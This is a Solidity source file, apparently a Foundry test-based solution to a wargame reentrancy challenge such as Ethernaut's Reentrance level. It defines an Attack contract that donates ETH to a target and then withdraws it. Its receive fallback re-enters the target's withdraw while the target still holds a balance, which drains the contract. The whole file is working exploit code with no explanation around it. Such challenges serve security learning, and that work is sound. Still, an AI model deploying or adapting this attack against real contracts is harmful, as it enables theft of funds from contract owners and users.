// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "forge-std/Test.sol";

interface IReentrance {
    function balanceOf(address _who) external view returns (uint256 balance);

    function withdraw(uint256 _amount) external;

    function donate(address _to) external payable;
}

contract Attack is Test {
    function drain(address payable _addr) external payable {
        console.log("Balance Before re-entering", address(this).balance);
        IReentrance(_addr).donate{value: msg.value}(_addr);
        IReentrance(_addr).withdraw(msg.value);
        console.log("Balance After re-entering", address(this).balance);
    }

    receive() external payable {
        if (msg.sender.balance != 0) {
            IReentrance(msg.sender).withdraw(msg.value);
        }
    }
}
